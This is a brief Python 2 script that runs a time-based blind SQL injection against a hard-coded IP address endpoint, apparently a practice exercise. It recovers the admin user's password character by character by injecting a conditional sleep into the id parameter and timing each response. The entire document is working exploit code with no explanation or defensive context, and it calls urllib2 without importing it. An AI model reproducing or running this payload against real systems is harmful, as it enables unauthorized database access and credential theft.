from urllib import quote
import time

#running on ubuntu with python 2.7 version

key = ""
for i in range(1, 30):
    for j in range(65,127):
        url = "http://45.32.53.225/DSM/sql/ex4.php?id="
        data = "-1'||if((select substr(pw,"+str(i)+",1) from user where id='admin')=%s,sleep(0.5), 0)-- -" % hex(j)
        data = quote(data)
        st = time.time()
        re = urllib2.urlopen(url+data)
        et = time.time()
        print (chr(j),st, ' : ' , et, ' ==> ' , (et-st))
        if et-st > 0.5:
            key += chr(j)
            print (key)
#print key